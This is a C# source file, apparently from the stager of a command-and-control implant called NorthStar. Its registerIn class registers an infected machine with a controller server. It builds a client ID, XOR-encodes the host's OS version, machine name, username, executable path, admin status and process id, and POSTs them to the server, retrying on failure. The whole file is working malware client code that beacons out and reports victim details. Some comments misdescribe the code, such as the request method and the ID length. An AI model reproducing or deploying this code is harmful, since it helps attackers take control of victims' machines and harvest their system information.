using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace NorthStarStager
{

    /*
    <explanation>
     Class that performs register operations.
     </explanation>
    */
    class registerIn
    {

        public string clientId;
        public bool isComplete = false;
        public static int errorCounter = 0;
        System.Net.WebClient web;
        Chiper chiperObj;

        public registerIn(initialEnum enumed, Chiper chipops, System.Net.WebClient webObj)
        {
            chiperObj = chipops;
            web = webObj;
            if (clientId == null && isComplete == false)
            {
                _registerFirstStage(enumed);
            }
        }


        /*
        <explanation>
        Creates 18 characters long Uniq client-id. 
        This ID will be used in any request will be sended to controller server.
        For extra security layer  prepend character 'N' and append character 'q' are exists.
        Those characters and length of ID will be checked by server to determine wether is valid client or not.
         </explanation>
        */
        private void _setID(ref initialEnum enumed)
        {
            Random random = new Random();
            string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder(16);
            for (int i = 0; i <= 16; i++)
            {
                result.Append(characters[random.Next(characters.Length)]);
            }

            clientId = "N" + result.ToString() + "q";
            enumed.clientID = clientId;
        }


        /*
       <explanation>
        Second stage of registration process.
        In this stage; operating system, machine name, username, working directory, process id and current privileges are send to server
        via POST request in base64 format. And if server returns "OK" as response, registration process will be marked as completed.
        Otherwise, function waits for 5 seconds and tries to send POST request again.
        <variable>isCompleted</variable> will be used for checking if registration process is completed.
        </explanation>
       */
        private void _registerSecondStage(ref initialEnum enumed)
        {
           
            if (errorCounter < 20)
            {

                OperatingSystem os_info = System.Environment.OSVersion;

                string opsys = chiperObj._base64encode(chiperObj._xorOps(enumed.osVer, enumed.xorKey));
                string mName = chiperObj._base64encode(chiperObj._xorOps(enumed.mName, enumed.xorKey));
                string sus = chiperObj._base64encode(chiperObj._xorOps(enumed.userName, enumed.xorKey));
                string wdir = chiperObj._base64encode(chiperObj._xorOps(enumed.executablePath, enumed.xorKey));
                string isadmin = chiperObj._base64encode(chiperObj._xorOps(enumed.isAdmin.ToString(), enumed.xorKey));
                string pid = chiperObj._base64encode(chiperObj._xorOps(enumed.processId.ToString(), enumed.xorKey));
                string id = chiperObj._base64encode(chiperObj._xorOps(enumed.clientID, "northstar"));

                string myParameters = "sid=" + id + "&opsys=" + opsys + "&mName=" + mName + "&sus=" + sus + "&wdir=" + wdir + "&pid=" + pid + "&isadm=" + isadmin;

                web.Headers[System.Net.HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                try
                {

                    string res = web.UploadString(Globals.registerSecondStageUri, myParameters);

                    if (!res.Contains("NOT FOUND"))
                    {
                        isComplete = true;
                        errorCounter = 0;

                    }
                    else
                    {
                        errorCounter += 1;
                        System.Threading.Thread.Sleep(5000);
                        _registerSecondStage(ref enumed);
                    }
                }
                catch
                {
                    errorCounter += 1;
                    System.Threading.Thread.Sleep(5000);
                    _registerSecondStage(ref enumed);
                }
            }
            else
            {
                isComplete = false;
            }
        }


        /*
        <explanation>
         First stage of registration process.
         In this stage, client sends a GET request to login.php.
         If "OK" returns by server second stage of registration process will start.
         </explanation>
        */
        private void _registerFirstStage(initialEnum enumed)
        {

            if (errorCounter < 20)
            {


                _setID(ref enumed);
                string sid = chiperObj._base64encode(chiperObj._xorOps(enumed.clientID, "northstar"));
                web.Headers[System.Net.HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                try
                {
                    string myParameters = "sid=" + sid;
                    string stat = web.UploadString(Globals.registerFirstStageUri, myParameters);
                    enumed.xorKey = chiperObj._xorOps(chiperObj._base64decode(stat), Globals.tempKey);
                    errorCounter = 0;
                    _registerSecondStage(ref enumed);

                }
                catch
                {
                    errorCounter += 1;
                    System.Threading.Thread.Sleep(5000);
                    _registerFirstStage(enumed);
                }
            }
            else { isComplete = false; }

        }

    }
}
